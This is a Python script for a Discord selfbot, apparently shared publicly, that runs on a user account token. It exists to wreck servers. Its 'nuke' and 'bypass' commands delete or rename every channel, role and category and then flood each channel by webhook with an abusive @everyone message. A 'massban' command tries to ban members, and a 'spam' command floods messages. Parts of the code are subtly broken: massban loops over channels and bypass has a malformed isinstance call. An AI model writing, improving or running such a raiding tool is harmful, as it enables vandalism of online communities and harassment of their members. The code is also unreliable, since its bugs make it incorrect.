# public
print("Selfbot made by adxtrz")
import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable,"-m","pip","install",package])


packages=[
    "discord.py==1.7.3","asyncio","logging","pystyle"
]

for package in packages:
    try:
        __import__(package)
    except ImportError:
        install(package)


creds=f"""                                         
 @@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@   @@@@@@@@  
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@!  !@@    @@!    @@!  @@@       @@!  
!@!  @!@  !@!  @!@  !@!  @!!    !@!    !@!  @!@      !@!   
@!@!@!@!  @!@  !@!   !@@!@!     @!!    @!@!!@!      @!!    
!!!@!!!!  !@!  !!!    @!!!      !!!    !!@!@!      !!!     
!!:  !!!  !!:  !!!   !: :!!     !!:    !!: :!!    !!:      
:!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       
::   :::   :::: ::   ::  :::     ::    ::   :::   :: ::::  
 :   : :  :: :  :    :   ::      :      :   : :  : :: : :  
                  < = + a d x t r z + = >
"""
import discord
from discord.ext import commands
import asyncio
import os
import logging
from pystyle import Colors,Colorate

nukemsg=f"""
@everyone + @here
# reckless victory
- fuck you all
- get pwned LOLOLOL
"""
prefix="$"
token='token here'
chname="owned"
whname="wrecked"
catname="demolished"
rlname="ended"
nuke=False
servname="soloed"
helpmsg=f"""
```ansi
 @@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@   @@@@@@@@  
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@!  !@@    @@!    @@!  @@@       @@!  
!@!  @!@  !@!  @!@  !@!  @!!    !@!    !@!  @!@      !@!   
@!@!@!@!  @!@  !@!   !@@!@!     @!!    @!@!!@!      @!!    
!!!@!!!!  !@!  !!!    @!!!      !!!    !!@!@!      !!!     
!!:  !!!  !!:  !!!   !: :!!     !!:    !!: :!!    !!:      
:!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       
::   :::   :::: ::   ::  :::     ::    ::   :::   :: ::::  
 :   : :  :: :  :    :   ::      :      :   : :  : :: : :  
                  < = + a d x t r z + = >
╠════════════════════════════════════════════════════════╣
{prefix}nuke = nukes the server
{prefix}bypass = nukes the server via security bypass methods
{prefix}massban = bans everyone in the server
{prefix}spam (amount) (message) = spams the msg in the amount u want it to
╠════════════════════════════════════════════════════════╣
```
"""
adxtrz=commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),help_command=None,self_bot=True)
logging.disable(logging.CRITICAL)


def clearconsole():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


@adxtrz.event
async def on_connect():
    creds1=f"""                       
 @@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@   @@@@@@@@  
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@!  !@@    @@!    @@!  @@@       @@!  
!@!  @!@  !@!  @!@  !@!  @!!    !@!    !@!  @!@      !@!   
@!@!@!@!  @!@  !@!   !@@!@!     @!!    @!@!!@!      @!!    
!!!@!!!!  !@!  !!!    @!!!      !!!    !!@!@!      !!!     
!!:  !!!  !!:  !!!   !: :!!     !!:    !!: :!!    !!:      
:!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       
::   :::   :::: ::   ::  :::     ::    ::   :::   :: ::::  
 :   : :  :: :  :    :   ::      :      :   : :  : :: : :  
< = + a d x t r z + = >       +      connected as {adxtrz.user}
"""
    clearconsole()
    print(Colorate.Horizontal(Colors.black_to_red,(creds1)))
    print(Colorate.Horizontal(Colors.black_to_red,(f"You are in {len(adxtrz.guilds)} servers")))
    print(Colorate.Horizontal(Colors.black_to_red,(f"Prefix: {prefix}")))
    print(Colorate.Horizontal(Colors.black_to_red,(f"{prefix}help for all commands")))


@adxtrz.command()
async def help(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    await ctx.send(helpmsg,delete_after=6)


@adxtrz.command()
async def nuke(ctx):
    global nuke
    nuke=True
    guild=ctx.guild
    chans=guild.channels
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        await guild.edit(name=servname)
    except:
        pass
    for ch in chans:
        try:
            await ch.delete()
        except:
            pass
    while nuke:
        try:
            await guild.create_text_channel(name=chname)
        except:
            pass


@adxtrz.event
async def on_guild_channel_create(channel):
  global nuke
  if nuke == True:
      webhook=await channel.create_webhook(name=whname)
      try:
          while True:
              await asyncio.sleep(0.001)
              await webhook.send(content=nukemsg)
      except:
          pass


@adxtrz.command()
async def massban(ctx):
    guild=ctx.guild
    membs=guild.channels
    try:
        await ctx.message.delete()
    except:
        pass
    for m in membs:
        if m != ctx.author:
            try:
                await m.ban(reason="test")
            except:
                pass


@adxtrz.command()
async def bypass(ctx):
    guild=ctx.guild
    cats=guild.categories
    chans=guild.channels
    rls=guild.roles
    try:
        await ctx.message.delete()
    except:
        pass
    for ch in chans:
        if isinstance(discord.CategoryChannel):
            return
        try:
            await ch.edit(name=chname,category=None)
        except:
            pass
    for cat in cats:
        try:
            await cat.edit(name=catname)
        except:
            pass
    for rl in rls:
        try:
            await rl.edit(name=rlname)
        except:
            pass
    for ch in chans:
        try:
            webhook=await ch.create_webhook(name=whname)
            try:
                for _ in range(3):
                    await webhook.send(nukemsg)
            except:
                pass
        except:
            pass


@adxtrz.command()
async def spam(ctx,amount:int,*,msg):
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        for _ in range(amount):
            await ctx.send(msg)
    except:
        pass


try:
    print(Colorate.Horizontal(Colors.black_to_red,f"Logging in using provided token"))
    adxtrz.run(token,bot=False)
except discord.LoginFailure:
    clearconsole()
    print(Colorate.Horizontal(Colors.black_to_red,(creds)))
    print(Colorate.Horizontal(Colors.black_to_red,f"Login failed"))
except discord.HTTPException as e:
    clearconsole()
    print(Colorate.Horizontal(Colors.black_to_red,(creds)))
    print(Colorate.Horizontal(Colors.black_to_red,f"{e}"))
